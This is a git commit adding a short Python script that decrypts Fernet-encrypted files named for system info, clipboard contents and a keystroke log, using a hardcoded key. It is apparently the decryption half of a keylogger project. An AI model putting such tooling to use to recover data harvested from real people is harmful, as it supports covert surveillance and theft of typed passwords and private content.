393de2a3f6d3a057dfb2eaa30b7d45dcad46aea5
Niladri Mitra <68425568+niladrimitra11@users.noreply.github.com>
2023-08-10 01:09:40 +0530

    Add files via upload

---
+++ DecryptFile.py
@@ -0,0 +1,26 @@
+from cryptography.fernet import Fernet
+
+key = "ND1jSHguxip-FKiBvMt5LElnEczUUVJfry-18UQJ41M="
+
+system_information_e = 'e_systeminfo.txt'
+clipboard_information_e = 'e_clipboard.txt'
+keys_information_e = 'e_key_log.txt'
+
+
+
+encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
+count = 0
+
+
+for decrypting_files in encrypted_files:
+
+    with open(encrypted_files[count], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    decrypted = fernet.decrypt(data)
+
+    with open("decryption.txt", 'ab') as f:
+        f.write(decrypted)
+
+    count += 1
